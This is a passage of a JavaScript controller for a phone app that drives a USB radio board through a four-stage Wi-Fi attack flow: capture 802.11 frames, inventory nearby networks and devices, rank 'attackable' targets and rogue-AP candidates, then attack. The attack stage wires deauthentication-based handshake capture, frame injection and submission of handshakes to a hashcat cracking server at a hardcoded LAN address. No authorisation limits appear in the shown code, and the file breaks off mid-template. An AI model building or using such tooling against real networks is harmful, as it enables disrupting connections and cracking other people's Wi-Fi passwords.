// app.js — controller.
//
// SPIKE SCOPE: prove the USB-OTG serial link to the board and complete a PING
// round-trip against stock firmware. The four-stage flow is laid out but its
// stages are stubs — the real work lands once the link is proven.

import { encodeFrame, encodeCmd, FrameDecoder, payloadJson, TYPE, typeName } from './protocol.js';
import { UsbTransport } from './transport.js';
import { Icon, STAGE_ICONS } from './icons.js';
import { CaptureSession } from './capture.js';
import { analyzeChunks, findings } from './analyze.js';
import { plan, reportText, topTarget } from './analysis.js';
import { attackList, blockedOnTransmit } from './attacks.js';
import { buildDeauth } from './attack.js';
import { extractHandshakes, hashFile } from './crack.js';
import { CrackBridge } from './bridge.js';

const $ = (sel) => document.querySelector(sel);

// ── logging ───────────────────────────────────────────────────────────────────
const logEl = () => $('#log');

function log(kind, text) {
  const el = logEl();
  if (!el) return;
  const t = new Date().toLocaleTimeString([], { hour12: false });
  const line = document.createElement('div');
  const cls = { tx: 'tx', rx: 'rx', err: 'er', ev: 'ev' }[kind] || '';
  line.innerHTML = `<span class="t">${t}</span> <span class="${cls}">${escapeHtml(text)}</span>`;
  el.appendChild(line);
  el.scrollTop = el.scrollHeight;
}

function escapeHtml(s) {
  return String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
}

// ── state ─────────────────────────────────────────────────────────────────────
const state = {
  devices: [],
  deviceInfo: null,   // last PING response
  nextId: 1,
  pending: new Map(), // frame id -> { resolve, reject, timer, label }
  stage: 'capture',
};

// The Capture stage's session. Declared before the decoder because the decoder
// feeds it PCAP frames; assigned once request() exists, further down.
let capture = null;

const transport = new UsbTransport({
  onData: (bytes) => decoder.push(bytes),
  onStatus: (kind, detail) => {
    if (kind === 'connected')   log('ev', `link up: ${detail.driver} (portId ${detail.portId})`);
    if (kind === 'disconnected') log('ev', 'link down');
    if (kind === 'detached')    { log('err', 'device detached'); setConnected(false); }
    if (kind === 'error')       log('err', 'stream error: ' + JSON.stringify(detail));
    setConnected(transport.connected);
  },
});

const decoder = new FrameDecoder({
  onFrame: (f) => {
    // PCAP frames are the payload of a sync, not something to narrate. One line
    // per frame would bury the protocol traffic under hundreds of lines.
    if (f.type === TYPE.PCAP) {
      capture?.onPcapChunk(f.payload);
      return;
    }
    const json = f.type === TYPE.RESP || f.type === TYPE.EVENT ? payloadJson(f.payload) : null;
    log('rx', `${typeName(f.type)} id=${f.id} ${json ? JSON.stringify(json) : f.payload.length + 'B'}`);
    if (f.type === TYPE.EVENT && json) onEvent(json);
    if (f.type === TYPE.RESP && state.pending.has(f.id)) {
      const p = state.pending.get(f.id);
      clearTimeout(p.timer);
      state.pending.delete(f.id);
      p.resolve(json);
    }
  },
  onError: (msg) => log('err', 'decode: ' + msg),
});

// ── request/response ──────────────────────────────────────────────────────────
function request(cmd, args, { timeoutMs = 4000 } = {}) {
  return new Promise((resolve, reject) => {
    const id = state.nextId++ & 0xff;
    const frame = encodeCmd(id, cmd, args);
    log('tx', `${cmd} id=${id}${args ? ' ' + JSON.stringify(args) : ''}`);
    const timer = setTimeout(() => {
      state.pending.delete(id);
      reject(new Error(`${cmd} timed out after ${timeoutMs}ms`));
    }, timeoutMs);
    state.pending.set(id, { resolve, reject, timer, label: cmd });
    transport.send(frame).catch((e) => {
      clearTimeout(timer);
      state.pending.delete(id);
      reject(e);
    });
  });
}

// ── capture session ───────────────────────────────────────────────────────────
capture = new CaptureSession({
  request,
  log,
  onProgress: () => { if (state.stage === 'capture') renderCaptureStats(); },
});

// ── ui ────────────────────────────────────────────────────────────────────────
function setConnected(on) {
  const pill = $('#connPill');
  if (pill) {
    pill.className = 'pill ' + (on ? 'on' : '');
    pill.innerHTML = `<span class="dot"></span>${on ? 'linked' : 'offline'}`;
  }
  const link = $('#linkBtn');
  if (link) link.classList.toggle('hidden', !on);
  $('#connectCard')?.classList.toggle('hidden', on);
  $('#consoleCard')?.classList.toggle('hidden', !on);
}

function renderDevices() {
  const box = $('#deviceList');
  if (!box) return;
  if (!state.devices.length) {
    box.innerHTML = `<div class="empty">${Icon('unlink', { size: 30 })}No USB serial device found.<br>Plug the board into the phone.</div>`;
    return;
  }
  box.innerHTML = state.devices.map((d) => `
    <div class="device" data-device-id="${escapeHtml(String(d.deviceId))}">
      ${Icon('plug', { size: 20 })}
      <div class="meta">
        <div class="name">${escapeHtml(d.deviceName || 'USB serial device')}</div>
        <div class="sub">${escapeHtml(d.driverType || 'unknown driver')} · ${d.hasPermission ? 'permission granted' : 'needs permission'}</div>
      </div>
      ${Icon('chevron', { size: 18 })}
    </div>`).join('');

  box.querySelectorAll('.device').forEach((el) => {
    el.addEventListener('click', () => {
      const id = el.dataset.deviceId;
      const dev = state.devices.find((d) => String(d.deviceId) === id);
      if (dev) onPickDevice(dev);
    });
  });
}

async function refreshDevices() {
  try {
    state.devices = await transport.listDevices();
    log('ev', `found ${state.devices.length} device(s)`);
    renderDevices();
  } catch (e) {
    log('err', 'listDevices failed: ' + e.message);
    $('#deviceList').innerHTML =
      `<div class="empty">${Icon('alert', { size: 30 })}${escapeHtml(e.message)}</div>`;
  }
}

async function onPickDevice(dev) {
  try {
    log('ev', `opening ${dev.deviceName || dev.deviceId}…`);
    await transport.connect(dev);
    setConnected(true);
    // First thing on every link: prove the device is actually talking.
    await ping();
  } catch (e) {
    log('err', 'connect failed: ' + e.message);
  }
}

async function ping() {
  try {
    const resp = await request('PING');
    if (resp && resp.ok) {
      state.deviceInfo = resp;
      log('ev', `PING ok — transport=${resp.transport}`);
      renderDeviceInfo(resp);
    } else {
      log('err', 'PING returned ' + JSON.stringify(resp));
    }
  } catch (e) {
    log('err', e.message);
  }
}

function renderDeviceInfo(info) {
  const box = $('#deviceInfo');
  if (!box) return;
  box.innerHTML = `
    <dl class="kv">
      <dt>transport</dt><dd>${escapeHtml(info.transport || '—')}</dd>
      <dt>driver</dt><dd>${escapeHtml(transport.deviceId != null ? 'USB-OTG serial' : '—')}</dd>
    </dl>`;
}

function renderStages() {
  const order = ['capture', 'analyze', 'analysis', 'attack'];
  const labels = { capture: 'Capture', analyze: 'Analyze', analysis: 'Analysis', attack: 'Attack' };
  const box = $('#stages');
  if (!box) return;
  box.innerHTML = order.map((s, i) => `
    <button class="stage ${state.stage === s ? 'active' : ''}" data-stage="${s}">
      <span class="num">STEP ${i + 1}</span>
      ${Icon(STAGE_ICONS[s], { size: 22 })}
      <span class="label">${labels[s]}</span>
    </button>`).join('');
  box.querySelectorAll('.stage').forEach((el) => {
    el.addEventListener('click', () => {
      state.stage = el.dataset.stage;
      renderStages();
      renderStagePanel();
    });
  });
}

// ── events from the device ────────────────────────────────────────────────────
function onEvent(json) {
  if (json.event === 'capture_done') {
    capture.onCaptureDone(json);
    stopCapTicker();
    log('ev', `capture finished on its own: ${json.frames ?? '?'} frames, ${json.dropped ?? '?'} dropped`);
    if (state.stage === 'capture') renderStagePanel();
    return;
  }
  // 'stage' and 'hb' describe the DEVICE's radio state. state.stage is the
  // OPERATOR's position in the flow. Related, but not the same thing — so one
  // never moves the other. A board that says "idle" is not the operator
  // deciding to leave the Capture step.
}

// ── capture panel ─────────────────────────────────────────────────────────────
const CHANNELS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13];
const DURATIONS = [
  { v: 5000,  label: '5 s' },
  { v: 10000, label: '10 s' },
  { v: 30000, label: '30 s' },
  { v: 60000, label: '60 s' },
];

let capTicker = null;
function stopCapTicker() {
  if (capTicker) { clearInterval(capTicker); capTicker = null; }
}
// Poll the board while it sniffs. The capture runs for seconds with nothing
// else to look at, and a live frame count is the difference between "working"
// and "hung" — the link is proven, so it is a cheap question to keep asking.
function startCapTicker() {
  stopCapTicker();
  capTicker = setInterval(async () => {
    if (!capture.running) { stopCapTicker(); return; }
    try {
      const s = await request('CAPTURE_STATS', undefined, { timeoutMs: 3000 });
      if (s && s.ok) { capture.stats = s; renderCaptureStats(); }
    } catch { /* link busy this tick — the next one will try again */ }
  }, 1000);
}

function fmtBytes(n) {
  if (n == null) return '—';
  if (n < 1024) return n + ' B';
  if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
  return (n / 1048576).toFixed(2) + ' MB';
}

function renderStagePanel() {
  const box = $('#stagePanel');
  if (!box) return;
  if (state.stage === 'capture') { renderCapturePanel(box); return; }
  if (state.stage === 'analyze') { renderAnalyzePanel(box); return; }
  if (state.stage === 'analysis') { renderAnalysisPanel(box); return; }
  if (state.stage === 'attack') { renderAttackPanel(box); return; }
  box.innerHTML = `<div class="empty">${Icon(STAGE_ICONS[state.stage], { size: 30 })}
    <strong>${state.stage}</strong><br>Not wired yet.</div>`;
}

function renderCapturePanel(box) {
  const running = capture.running;
  box.innerHTML = `
    <div class="stagehead">
      ${Icon('capture', { size: 22 })}
      <div>
        <div class="stagename">Capture</div>
        <div class="stagesub">802.11 frames into the board's PSRAM, then synced down to a pcap on this phone.</div>
      </div>
    </div>

    <div class="fields">
      <label class="field">
        <span>Channel</span>
        <select id="capChannel" ${running ? 'disabled' : ''}>
          ${CHANNELS.map((c) => `<option value="${c}"${c === capture.channel ? ' selected' : ''}>${c}</option>`).join('')}
        </select>
      </label>
      <label class="field">
        <span>Duration</span>
        <select id="capDuration" ${running ? 'disabled' : ''}>
          ${DURATIONS.map((d) => `<option value="${d.v}"${d.v === capture.durationMs ? ' selected' : ''}>${d.label}</option>`).join('')}
        </select>
      </label>
    </div>

    <div class="row">
      <button id="capStart" class="primary ${running ? 'hidden' : ''}">${Icon('capture', { size: 18 })}Start capture</button>
      <button id="capStop" class="danger ${running ? '' : 'hidden'}">${Icon('stop', { size: 18 })}Stop</button>
    </div>

    <div id="capStats"></div>

    <div class="row" style="margin-top:10px">
      <button id="capSync" class="ghost" ${running || !capture.stats ? 'disabled' : ''}>${Icon('refresh', { size: 18 })}Sync to phone</button>
      <button id="capSave" class="ghost" ${capture.hasData ? '' : 'disabled'}>${Icon('save', { size: 18 })}Save pcap</button>
    </div>

    ${capture.saved ? `<div class="saved">${Icon('check', { size: 16 })}
      <span>${escapeHtml(capture.saved.path)} · ${fmtBytes(capture.saved.bytes)}</span></div>` : ''}
  `;

  $('#capChannel')?.addEventListener('change', (e) => { capture.channel = Number(e.target.value); });
  $('#capDuration')?.addEventListener('change', (e) => { capture.durationMs = Number(e.target.value); });
  $('#capStart')?.addEventListener('click', onCaptureStart);
  $('#capStop')?.addEventListener('click', onCaptureStop);
  $('#capSync')?.addEventListener('click', onCaptureSync);
  $('#capSave')?.addEventListener('click', onCaptureSave);

  renderCaptureStats();
}

function renderCaptureStats() {
  const el = $('#capStats');
  if (!el) return;
  const s = capture.summary();
  const dev = capture.stats;
  const rows = [];

  if (dev) {
    rows.push(['board frames', dev.frames ?? '—']);
    rows.push(['board dropped', dev.dropped ?? '—']);
    rows.push(['board bytes', fmtBytes(dev.bytes)]);
  }
  if (s.packets) {
    rows.push(['file packets', s.packets]);
    rows.push(['file size', fmtBytes(s.bytes)]);
    if (s.spanMs != null) rows.push(['timeline', s.spanMs.toFixed(0) + ' ms']);
    // Say which timestamps you actually got. A pcap whose records all carry the
    // phone's arrival time is not wrong, but it cannot be trusted to order
    // events — and that difference is invisible in the file.
    rows.push(['timestamps', s.untimed === 0
      ? `TSFT (${s.timed})`
      : `${s.timed} TSFT / ${s.untimed} arrival`]);
  }

  el.innerHTML = rows.length
    // Every value here is either a number formatted by fmtBytes or a string
    // passed through escapeHtml — nothing reaches the DOM raw.
    ? `<dl class="kv">${rows.map(([k, v]) => `<dt>${k}</dt><dd>${escapeHtml(String(v))}</dd>`).join('')}</dl>`
    : '';
}

async function onCaptureStart() {
  try {
    const resp = await capture.start({ channel: capture.channel, durationMs: capture.durationMs });
    log('ev', `capture started ch${resp.channel} for ${resp.duration_ms} ms, buffer ${fmtBytes(resp.buf_bytes)}`);
    renderStagePanel();
    startCapTicker();
  } catch (e) {
    log('err', 'capture start: ' + e.message);
  }
}

async function onCaptureStop() {
  stopCapTicker();
  try {
    const resp = await capture.stop();
    log('ev', `capture stopped: ${resp?.frames ?? '?'} frames, ${resp?.dropped ?? '?'} dropped`);
  } catch (e) {
    log('err', 'capture stop: ' + e.message);
  }
  renderStagePanel();
}

async function onCaptureSync() {
  const btn = $('#capSync');
  if (btn) { btn.disabled = true; btn.textContent = 'Syncing…'; }
  try {
    await capture.sync();
    const s = capture.summary();
    log('ev', `synced ${s.packets} packets, ${fmtBytes(s.bytes)}, span ${s.spanMs == null ? '—' : s.spanMs.toFixed(0) + ' ms'}`);
  } catch (e) {
    log('err', 'sync: ' + e.message);
  }
  renderStagePanel();
}

async function onCaptureSave() {
  try {
    const saved = await capture.save();
    log('ev', `saved ${saved.path} (${fmtBytes(saved.bytes)}, ${saved.packets} packets)`);
    renderStagePanel();
  } catch (e) {
    log('err', 'save: ' + e.message);
  }
}

// ── analyze panel ─────────────────────────────────────────────────────────────
// Reading the capture. This is pure phone-side parsing of frames already synced
// down, so there is no device round-trip and no way for it to disturb the radio.
let analyzeResult = null;
let analysisPlan = null;

function renderAnalyzePanel(box) {
  const w = capture.writer;
  const n = w ? w.chunks.length : 0;
  const ready = n > 0;

  // Every interpolated value below is a static string, a number, or has been
  // through escapeHtml — nothing from the air reaches the DOM raw.
  box.innerHTML = `
    <div class="stagehead">
      ${Icon('analyze', { size: 22 })}
      <div>
        <div class="stagename">Analyze</div>
        <div class="stagesub">Read the captured frames and work out what is on the air — access
          points, their security, and what devices are asking for.</div>
      </div>
    </div>

    <div class="row">
      <button id="anRun" class="primary" ${ready ? '' : 'disabled'}>
        ${Icon('analyze', { size: 18 })}Analyze ${ready ? n + ' frames' : 'frames'}
      </button>
    </div>

    ${ready ? '' : `<div class="empty">${Icon('capture', { size: 30 })}
      Nothing captured yet.<br>Run a capture and sync it down first.</div>`}

    <div id="anOut">${analyzeResult ? analyzeReportHtml(analyzeResult) : ''}</div>
  `;

  $('#anRun')?.addEventListener('click', onAnalyzeRun);
}

function onAnalyzeRun() {
  const w = capture.writer;
  if (!w || !w.chunks.length) return;
  const t0 = Date.now();
  try {
    analyzeResult = analyzeChunks(w.chunks);
    const ms = Date.now() - t0;
    log('ev', `analyzed ${analyzeResult.frames} frames in ${ms} ms — ` +
      `${analyzeResult.aps.length} APs, ${analyzeResult.clients.length} clients, ` +
      `${analyzeResult.probes.length} leaked SSIDs`);
    if (analyzeResult.unparsed) log('err', `${analyzeResult.unparsed} frames did not parse`);
  } catch (e) {
    log('err', 'analyze: ' + e.message);
    return;
  }
  renderStagePanel();
}

function analyzeReportHtml(r) {
  const fs = findings(r);

  const findingHtml = fs.map((f) => `
    <div class="finding ${escapeHtml(f.level)}">
      <div class="ftitle">${escapeHtml(f.title)}</div>
      <div class="fdetail">${escapeHtml(f.detail)}</div>
    </div>`).join('');

  const apHtml = r.aps.map((a) => {
    const kind = a.security?.kind || 'unknown';
    const openish = /Open|WEP/.test(kind);
    const name = a.ssid || (a.hidden ? '(hidden network)' : '(no name)');
    return `
      <div class="ap">
        <div class="apicon ${openish ? 'bad' : 'good'}">${Icon(openish ? 'unlock' : 'lock', { size: 17 })}</div>
        <div class="apmain">
          <div class="apssid">${escapeHtml(name)}</div>
          <div class="apmeta">${escapeHtml(a.bssid)} · ch${a.channel ?? '?'} · ${a.bestRssi ?? '?'} dBm
            · ${escapeHtml(kind)}${a.clientCount ? ` · ${a.clientCount} client${a.clientCount > 1 ? 's' : ''}` : ''}</div>
        </div>
        <div class="apcount">${a.beacons}<span>beacons</span></div>
      </div>`;
  }).join('');

  const pnlHtml = r.probes.map((p) => `
    <div class="pnlitem">
      <div class="pnlssid">${escapeHtml(p.ssid)}</div>
      <div class="pnlmeta">${p.count} request${p.count > 1 ? 's' : ''}
        · ${p.clients} device${p.clients > 1 ? 's' : ''} · ${p.bestRssi ?? '?'} dBm</div>
    </div>`).join('');

  const clientHtml = r.clients.map((c) => `
    <div class="client">
      <div class="cmac">${escapeHtml(c.mac)}${c.randomized ? ' <span class="tag">randomised</span>' : ''}</div>
      <div class="cmeta">${c.frames} frames${c.bssid ? ' · on ' + escapeHtml(c.bssid) : ''}
        ${c.probed.length ? ' · asked for ' + c.probed.map(escapeHtml).join(', ') : ''}</div>
    </div>`).join('');

  const secRows = Object.entries(r.security)
    .sort((a, b) => b[1] - a[1])
    .map(([k, v]) => `<dt>${escapeHtml(k)}</dt><dd>${v}</dd>`).join('');

  const chanRows = r.channels
    .map((c) => `<dt>ch ${c.channel}</dt><dd>${c.frames}</dd>`).join('');

  return `
    ${findingHtml ? `<div class="findings">${findingHtml}</div>` : ''}

    <div class="secsum">
      <div class="sechead">${Icon('analyze', { size: 16 })} Frame summary</div>
      <dl class="kv">
        <dt>frames parsed</dt><dd>${r.parsed} of ${r.frames}${r.unparsed || r.noRadiotap ? ` (${r.unparsed + r.noRadiotap} skipped)` : ''}</dd>
        <dt>access points</dt><dd>${r.aps.length}</dd>
        <dt>clients</dt><dd>${r.clients.length}</dd>
        <dt>leaked names</dt><dd>${r.probes.length}</dd>
      </dl>
      ${secRows ? `<div class="sechead" style="margin-top:12px">${Icon('lock', { size: 16 })} Security</div><dl class="kv">${secRows}</dl>` : ''}
      ${chanRows ? `<div class="sechead" style="margin-top:12px">${Icon('list', { size: 16 })} Frames per channel</div><dl class="kv">${chanRows}</dl>` : ''}
    </div>

    <div class="sechead">${Icon('antenna', { size: 16 })} Access points (${r.aps.length})</div>
    <div class="aplist">${apHtml || '<div class="empty">none</div>'}</div>

    ${r.probes.length ? `
      <div class="sechead">${Icon('device', { size: 16 })} Remembered networks (${r.probes.length})</div>
      <div class="pnlnote">Networks a device has connected to before, asked for by name in the
        clear. This is the Preferred Network List — each one is a name a device will try to
        associate with if something claims it.</div>
      <div class="pnllist">${pnlHtml}</div>` : ''}

    ${r.clients.length ? `
      <div class="sechead">${Icon('device', { size: 16 })} Clients (${r.clients.length})</div>
      <div class="clientlist">${clientHtml}</div>` : ''}
  `;
}

// ── stage 3: analysis ─────────────────────────────────────────────────────────
// Analysis reads Analyze's result and produces a plan: which networks are worth
// acting on, in what order, and why. Entirely phone-side — like Analyze, it
// never touches the radio, so the ranking can change without a reflash.
//
// The plan is also what a one-tap flow consumes: each target carries the single
// action that follows from its verdict (deauth-capture, associate, listen).

function renderAnalysisPanel(box) {
  const ready = !!analyzeResult;

  box.innerHTML = `
    <div class="stagehead">
      ${Icon('analysis', { size: 22 })}
      <div>
        <div class="stagename">Analysis</div>
        <div class="stagesub">Turn the inventory into a plan — what is worth doing, in what
          order, and why. Nothing here touches the radio.</div>
      </div>
    </div>

    <div class="row">
      <button id="plRun" class="primary" ${ready ? '' : 'disabled'}>
        ${Icon('analysis', { size: 18 })}Build plan
      </button>
      <button id="plSave" class="ghost" ${analysisPlan ? '' : 'disabled'}>
        ${Icon('save', { size: 18 })}Save report
      </button>
    </div>

    ${ready ? '' : `<div class="empty">${Icon('analyze', { size: 30 })}
      Nothing analysed yet.<br>Run Analyze first — Analysis reads its result.</div>`}

    <div id="plOut">${analysisPlan ? analysisPlanHtml(analysisPlan) : ''}</div>
  `;

  $('#plRun')?.addEventListener('click', onAnalysisRun);
  $('#plSave')?.addEventListener('click', onAnalysisSave);
}

function onAnalysisRun() {
  if (!analyzeResult) return;
  try {
    analysisPlan = plan(analyzeResult);
  } catch (e) {
    log('err', 'analysis: ' + e.message);
    return;
  }
  const s = analysisPlan.summary;
  log('ev', `plan: ${s.attackable} attackable of ${s.networks} networks, ` +
    `${s.skipped} skipped, ${s.rogueNames} un-answered leaked name${s.rogueNames === 1 ? '' : 's'}`);
  const top = topTarget(analysisPlan);
  if (top) log('ev', `best target: ${top.name} — ${top.action.label}`);
  renderStagePanel();
}

/**
 * Write the plan out as text.
 *
 * Unlike the pcap this is a string, so `encoding: 'utf8'` is load-bearing:
 * Capacitor's Filesystem assumes base64 for a string `data` unless told
 * otherwise, and a base64-decode of plain text silently produces garbage.
 */
async function onAnalysisSave() {
  if (!analysisPlan) return;
  const d = new Date();
  const p = (n) => String(n).padStart(2, '0');
  const name = `analysis-${d.getFullYear()}${p(d.getMonth() + 1)}${p(d.getDate())}`
    + `-${p(d.getHours())}${p(d.getMinutes())}${p(d.getSeconds())}.txt`;
  try {
    const fs = window.Capacitor?.Plugins?.Filesystem;
    if (!fs) throw new Error('Filesystem plugin not available');
    const res = await fs.writeFile({
      path: `RadioConsole/${name}`,
      data: reportText(analysisPlan),
      directory: 'DOCUMENTS',
      encoding: 'utf8',
      recursive: true,
    });
    log('ev', `saved report ${res?.uri || name}`);
  } catch (e) {
    log('err', 'save report: ' + e.message);
  }
}

function analysisPlanHtml(p) {
  // As in renderAnalyzePanel: every value that came off the air — SSIDs, BSSIDs,
  // the leaked names, the reason text — goes through escapeHtml before it
  // reaches this template. Everything else is static markup or a number, so
  // nothing untrusted is interpolated raw.
  const s = p.summary;

  const targetHtml = p.targets.map((t) => {
    const reasons = t.reasons.map((r) => `
      <li class="${r.points ? '' : 'zero'}">
        <span class="rp ${r.points > 0 ? 'up' : r.points < 0 ? 'down' : ''}">${r.points > 0 ? '+' : ''}${r.points}</span>
        <span class="rt">${escapeHtml(r.text)}</span>
      </li>`).join('');

    return `
      <div class="target ${escapeHtml(t.level)}">
        <div class="thead">
          <div class="trank">${t.rank ? '#' + t.rank : '—'}</div>
          <div class="tmain">
            <div class="tname">${escapeHtml(t.name)}</div>
            <div class="tmeta">${escapeHtml(t.bssid)} · ch${t.channel ?? '?'} · ${t.rssi ?? '?'} dBm · ${escapeHtml(t.security)}</div>
          </div>
          <div class="tscore">${t.score}<span>score</span></div>
        </div>
        <div class="tverdict">${escapeHtml(t.verdict)}</div>
        <ul class="reasons">${reasons}</ul>
        <div class="taction ${escapeHtml(t.action.type)}">${Icon('attack', { size: 15 })}${escapeHtml(t.action.label)}</div>
      </div>`;
  }).join('');

  const rogueHtml = p.rogue.map((g) => `
    <div class="rogueitem ${g.onAir ? 'onair' : 'void'}">
      <div class="rssid">${escapeHtml(g.ssid)}</div>
      <div class="rmeta">${g.count} request${g.count > 1 ? 's' : ''} · ${g.clients} device${g.clients > 1 ? 's' : ''} · ${g.bestRssi ?? '?'} dBm · ${g.onAir ? 'on air' : 'not on air'}</div>
      <div class="rnote">${escapeHtml(g.note)}</div>
    </div>`).join('');

  const top = topTarget(p);

  return `
    <div class="secsum">
      <div class="sechead">${Icon('analysis', { size: 16 })} Plan</div>
      <dl class="kv">
        <dt>networks</dt><dd>${s.networks}</dd>
        <dt>attackable</dt><dd>${s.attackable}</dd>
        <dt>skipped</dt><dd>${s.skipped}</dd>
        <dt>un-answered names</dt><dd>${s.rogueNames}</dd>
      </dl>
      ${top ? `<div class="topnote">${Icon('attack', { size: 16 })}
        <span>Best target: <strong>${escapeHtml(top.name)}</strong> — ${escapeHtml(top.action.label)}</span></div>` : ''}
    </div>

    <div class="sechead">${Icon('list', { size: 16 })} Targets (${p.targets.length})</div>
    <div class="targetlist">${targetHtml || '<div class="empty">none</div>'}</div>

    ${p.rogue.length ? `
      <div class="sechead">${Icon('device', { size: 16 })} Rogue-AP candidates (${p.rogue.length})</div>
      <div class="pnlnote">A name a device keeps asking for that no AP is answering is the
        strongest play here — a rogue AP claiming it would be the only AP claiming it.</div>
      <div class="roguelist">${rogueHtml}</div>` : ''}
  `;
}

// ── attack panel ──────────────────────────────────────────────────────────────
// Stage 4. Everything above this line listens; this is the first stage that
// could change the air, so the panel is built around saying plainly what is and
// is not possible right now rather than around a row of buttons that mostly do
// nothing.
//
// Two of the four attacks are wired to real work today: password cracking runs
// end to end (extract here, search on the bridge). The other three need the
// radio to transmit, which our firmware cannot do — that is a firmware
// question, and the panel says so instead of pretending otherwise.

// Our firmware has a transmit path as of 0.3.0-tx: the TX_FRAME command takes a
// frame the app built and puts it on the air. This is the single honest answer
// to "can the radio inject?" — and it is not taken on faith. It was verified by
// injecting a beacon carrying this board's own MAC and reading it back with an
// independent receiver, then confirming the channel by doing it again on a
// different one. Flip this back to false only if the flashed firmware has no
// TX_FRAME — the panel will then block the three transmit attacks again, which
// is the correct behaviour rather than a regression.
const FIRMWARE_CAN_TRANSMIT = true;

const BRIDGE_DEFAULT_URL = 'http://192.168.1.169:8099';

let handshakeResult = null;   // crack extraction over the current capture
let bridgeStatus = null;      // last /health reading, null until tested
let bridgeError = null;
let crackJob = null;          // live progress: {state, progress, speed_hs, ...}
let crackRunning = false;
let txResult = null;          // last burst: {phase, requested, sent, failed, ...}
let txRunning = false;

function bridgeConfig() {
  return {
    url: localStorage.getItem('bridgeUrl') || BRIDGE_DEFAULT_URL,
    token: localStorage.getItem('bridgeToken') || '',
  };
}

function bridgeClient() {
  const c = bridgeConfig();
  return new CrackBridge({ baseUrl: c.url, token: c.token });
}

/** Everything the attack list needs to judge readiness. */
function attackContext() {
  return {
    hasCapture: !!capture?.writer?.chunks?.length,
    hasHandshake: !!handshakeResult?.handshakes?.length,
    canTransmit: FIRMWARE_CAN_TRANSMIT,
    bridgeReachable: !!bridgeStatus?.ok,
  };
}

function renderAttackPanel(box) {
  const ctx = attackContext();
  const list = attackList(ctx);
  const heldBack = blockedOnTransmit(ctx);
  const cfg = bridgeConfig();

  // Every air-derived value below — SSIDs, BSSIDs, the passphrase, error text
  // from the bridge — goes through escapeHtml. Everything else is static markup
  // or a number.
  const listHtml = list.map((a) => {
    const state = a.ready ? 'ready' : 'blocked';
    const blockers = a.blockers.map((b) => `
      <li><span class="bneed">${escapeHtml(b.need)}</span>${escapeHtml(b.text)}</li>`).join('');
    return `
    <div class="atk ${state}">
      <div class="atkhead">
        <span class="atkicon">${Icon(a.icon, { size: 18 })}</span>
        <div class="atkmain">
          <div class="atkname">${escapeHtml(a.name)}</div>
          <div class="atkmeta">${escapeHtml(a.kind)} · ${escapeHtml(a.built)}</div>
        </div>
        <div class="atkstate ${state}">${state === 'ready' ? 'ready' : 'blocked'}</div>
      </div>
      <div class="atktag">${escapeHtml(a.tagline)}</div>
      ${a.firmwareNote ? `<div class="atkfw">${
        a.firmware ? `<code>${escapeHtml(a.firmware)}</code> ` : ''
      }${escapeHtml(a.firmwareNote)}</div>` : ''}
      ${blockers ? `<ul class="blockers">${blockers}</ul>` : ''}
      ${a.id === 'crack' ? crackActionHtml(a) : ''}
      ${a.id === 'handshake' ? deauthActionHtml(a) : ''}
    </div>`;
  }).join('');

  box.innerHTML = `
    <div class="stagehead">
      ${Icon('attack', { size: 22 })}
      <div>
        <div class="stagename">Attack</div>
        <div class="stagesub">Automated attacks against what the capture found. Every entry says
          what it needs; nothing here reports having run when it did not.</div>
      </div>
    </div>

    <div class="secsum">
      <div class="sechead">${Icon('link', { size: 16 })} Crack bridge</div>
      <div class="pnlnote">The search runs on the GPU box, not on this phone — this phone extracts
        the handshake, the bridge searches the wordlist.</div>
      <div class="fields">
        <label class="field">
          <span>Bridge URL</span>
          <input id="brUrl" type="url" inputmode="url" autocapitalize="off" spellcheck="false"
                 value="${escapeHtml(cfg.url)}">
        </label>
        <label class="field">
          <span>Token</span>
          <input id="brToken" type="password" autocapitalize="off" spellcheck="false"
                 value="${escapeHtml(cfg.token)}" placeholder="from ~/projects/crackbridge/token">
        </label>
      </div>
      <div class="row">
        <button id="brTest" class="ghost">${Icon('link', { size: 18 })}Test connection</button>
      </div>
      <div id="brState">${bridgeStateHtml()}</div>
    </div>

    <div class="sechead">${Icon('list', { size: 16 })} Attacks (${list.length})</div>
    <div class="atklist">${listHtml}</div>

    ${heldBack.length ? `<div class="pnlnote">${heldBack.length} of these need the radio to
      transmit. That is one piece of work — a TX path in the firmware — not
      ${heldBack.length} separate problems.</div>` : ''}
  `;

  $('#brUrl')?.addEventListener('change', (e) => {
    localStorage.setItem('bridgeUrl', e.target.value.trim());
    bridgeStatus = null; bridgeError = null;
    renderStagePanel();
  });
  $('#brToken')?.addEventListener('change', (e) => {
    localStorage.setItem('bridgeToken', e.target.value.trim());
    bridgeStatus = null; bridgeError = null;
    renderStagePanel();
  });
  $('#brTest')?.addEventListener('click', onBridgeTest);
  $('#crackExtract')?.addEventListener('click', onExtractHandshakes);
  $('#crackRun')?.addEventListener('click', onCrackRun);
  $('#deauthGo')?.addEventListener('click', onDeauthCapture);
  $('#deauthStop')?.addEventListener('click', onDeauthStop);
}

function bridgeStateHtml() {
  if (bridgeError) {
    return `<div class="finding high"><div class="ftitle">${Icon('alert', { size: 15 })}Bridge unreachable</div>
      <div class="fdetail">${escapeHtml(bridgeError)}</div></div>`;
  }
  if (!bridgeStatus?.ok) {
    return `<div class="pnlnote">Not tested yet.</div>`;
  }
  const wl = (bridgeStatus.wordlists || []).join(', ') || 'none';
  return `<div class="finding low"><div class="ftitle">${Icon('check', { size: 15 })}Bridge reachable</div>
    <div class="fdetail">hashcat ${escapeHtml(bridgeStatus.hashcat || '?')} · mode
      ${escapeHtml(bridgeStatus.mode || '?')} · queued ${bridgeStatus.queued ?? 0} ·
      wordlists: ${escapeHtml(wl)}</div></div>`;
}

/** The crack attack's controls: extract, then submit what was found. */
function crackActionHtml(a) {
  if (!a.ready) return '';
  const hs = handshakeResult;

  if (crackRunning) {
    const p = crackJob || {};
    const pct = typeof p.progress === 'number' ? Math.round(p.progress * 100) : 0;
    return `
      <div class="crackbox">
        <div class="crackstate">searching — ${escapeHtml(p.state || 'running')}</div>
        <div class="pbar"><span style="width:${pct}%"></span></div>
        <div class="crackmeta">${pct}%${p.speed_hs ? ` · ${Math.round(p.speed_hs).toLocaleString()} H/s` : ''}
          · job ${escapeHtml(p.job_id || '')}</div>
      </div>`;
  }

  if (crackJob && crackJob.done) {
    const j = crackJob;
    if (j.state === 'cracked' && j.password) {
      return `
        <div class="crackbox win">
